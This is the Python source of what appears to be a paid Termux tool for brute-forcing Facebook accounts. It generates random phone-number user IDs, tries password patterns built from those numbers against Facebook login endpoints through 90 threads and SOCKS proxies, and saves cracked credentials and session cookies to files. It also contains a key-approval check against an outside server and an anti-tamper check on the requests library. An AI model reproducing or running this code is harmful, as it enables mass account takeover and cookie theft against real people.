            rp=requests.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers).json()
            if "session_key" in rp:
                oks.append(uid)
                print(f"\r\r[reverse white][HERON-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
                open("/sdcard/OLD.txt","a").write(uid+"|"+pw+"\n")
                ok_call()
                break 
            elif "Please Confirm Email" in str(rp):
                oks.append(uid)
                print(f"\r\r[reverse white][JANVI-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
                open("/sdcard/OLD.txt","a").write(uid+"|"+pw+"\n")
                ok_call()
                break
            elif "www.facebook.com" in str(rp):
                oks.append(uid)
                print(f"\r\r[reverse white][HERON-OK][/reverse white] [pale_green1]{uid} [white]|[/white][bright_red] {pw}   ")
                open("/sdcard/OLD.txt","a").write(uid+"|"+pw+"\n")
                ok_call()
                break
            else:continue
        loop+=1
    except Exception as e:
        time.sleep(20)
        
        

def coutpass(pwx):
    j=len(pwx)+1
    if j <9:
        return "0"+str(j)
    else:
        return str(j)
def ran():
    me.clear()
    user=[]
    pwx=[]
    print(logo)
    print("[white][[green]-[white]][green] [BD|IND|PK]  : 0171 +91629 +920315")
    print(Heron.line())
    code=str(input("[-] CHOICE  :  "))
    
    print(Heron.line())
    print("[white][[green]-[white]][green] EXAMPLE   :  100000 300000")
    limit=int(input("[-] CHOICE   :  "))
    print(Heron.line())
    for i in range(limit):
        gd=str(random.choice(range(1000000,9999999)))
        user.append(gd)
    
    passli=int(input("[-] PASS LIMIT   :  "))
    print(Heron.line())
    
    while True:
        print("[-] EXAMPUL   :  first6 last6 first8")
        pas=str(input(f"[-] ADD PASS {coutpass(pwx)} :  "))
        
        if "" ==pas:
            pass
        
        elif pas not in pwx:
            pwx.append(pas)
        print(Heron.line())
        if len(pwx) >=passli:
            break
        else:
            continue
    print("[white][[green]1[white]][green] Method (M)")
    print("[white][[green]2[white]][green] Method (X)")
    print("[white][[green]3[white]][green] Method (P)")
    print("[white][[green]4[white]][green] Method (Touch)")
    print("[white][[green]5[white]][green] Method (Free)")
    print("[white][[green]6[white]][green] Method (Mbasic)")
    print(Heron.line())
    meth=str(input("[-] CHOICE   :  "))
    if meth in ["1","a","A"]:
        fb="m"
    elif meth in ["2","b","B"]:
        fb="x"
    elif meth in ["3","c","C"]:
        fb="p"
    elif meth in ["4","d","D"]:
        fb="touch"
    elif meth in ["5","e","E"]:
        fb="free"
    else:
        fb="mbasic"
    with ThreadPool(max_workers=90) as heron:
        me.clear()
        print(logo)
        print(f"[white][[green]-[white]][green] SIM CODE    :   {code}")
        print(f"[white][[green]-[white]][green] PASS LIMIT  :   {str(len(pwx))}")
        print(f"[white][[green]-[white]][green] PROCESS HAS BERN STARTED")
        print(Heron.line())
        
        for xd in user:
            uid=code+xd
            heron.submit(rensub,uid,pwx,meth,fb,user)
    print("\r\r"+Heron.line())
    print(f" ~/ Total OK id : {str(len(oks))}")
    print(Heron.line())
    sys.exit()
#----------------------------[ RND-MTD ] --------------------------#
def rensub(uid,pwx,meth,fb,user):
    global oks,loop
    sys.stdout.write(f'\r•\033[0;37m[{random.choice(color)}JANVI-M{meth.upper()}\033[0;37m]-[\033[1;32m{loop}\033[1;91m|\033[0;37m{str(len(user))}\033[0;37m]-[\033[1;32mOK:{str(len(oks))}\033[0;37m]\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            session=requests.Session()
            pjanvis= {'http': 'socks4://'+random.choice(rx)}
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get(f'https://{fb}.facebook.com').text
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={
'Host': f'{fb}.facebook.com',
'content-length': str(len(str(data))),
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': uoa(),
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVo_Z7twFKE',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{fb}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{fb}.facebook.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,pjanviies=pjanvis)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                xx=coki.split("c_user=")[1]
                xd=xx[:15].replace(";","  ") 
                print(f"\r\r[white][[green]JANVI-OK[white]][green] {xd}[red] • [green]{ps}")
                open("/sdcard/JANVI-R-COOKIE.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                oks.append(xd)
                break
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(40)
    
import os,sys
try:
    count=0
    path="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests"
    files=os.listdir(path)
    for file in files:
        if file.endswith(".py"):
            data=open(path+"/"+file,"r").read().splitlines()
            for line in data:
                for i in line:
                   if i.isalpha:
                       count+=1
    if count ==173648:
        pass
    else:
        #me.clear()
        #reload()
        #rmsd()
        sys.exit("[!~] Unfortunately You can not use")
except Exception as e:
    sys.exit("run pip uninstall requests && pip install requests")

K1=str(os.getuid())
K2=str(os.getgid())
num_key="".join(K1+K2)

cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr).upper().replace("B","BOKACHUDA")
showkey=cm2.replace("'","").replace("==","")

def approve():
    url="https://heronafridi-"+"apv-yo3d.on"+"render."+"com/app"+"rove?key="+cm2
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=json.loads(buffer.getvalue().decode('utf-8'))
    except:
        reload()
        sys.exit("[!!] Internet Error...")
    
    
    if "S"+"u"+"cc"+"es"+"sful" in datax['Status']:
        username()
    elif 'rej'+'ected' in datax['Status']:
        me.clear()
        print(logo)
        print(' [b bright_white] # Notice-Paid Tool  ....')
        print(' [b bright_white] # Free User Don\'t Msg  ....')
        print(Heron.line())
        print(' [bright_green] # Key: '+showkey)
        
        os.system("xdg-open https://m.me/HeronAfridi.Official?text=Approve%20My%20Key%20%20"+showkey)
        time.sleep(1)
        #os.system("xdg-open https://wa.me/+8801722183463/?text=Approve%20My%20Key%20%20"+cm2)
        reload()
        sys.exit()
    else:
        #rmsd()
        sys.exit(" First Learn Python then try again to bypass")

def username():
    global cm2,usr
    me.clear()
    try:
        name=open("/sdcard/username.txt","r").read()
    except:
        print(logo)
        name=str(input(" \x1b[38;1;198m Π  \x1b[38;5;155mYour-Name   \x1b[38;5;197m‣\x1b[1;97m   "))
        print(Heron.line())
    
    try:
        url=f"https:/heronafridi-apv-yo3d.onrender.com/user?key={cm2}&name="+name.lower()
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        jdata=json.loads(buffer.getvalue().decode('utf-8'))
        jdata={"welcome":"true"}
    except:
        reload()
        sys.exit("[!!] Internet Error...")
    if "t"+"rue" in jdata["welcome"]:
        open("/sdcard/username.txt","w").write(name)
        ussr.append(name)
        main()
    else:
        print("  [r dark_olive_green1]Π![/r dark_olive_green1][chartreuse1] [b]Message[bright_white]: [chartreuse1] Username Not Approved...")
        print(Heron.line())
        reload()
        sys.exit()



username()
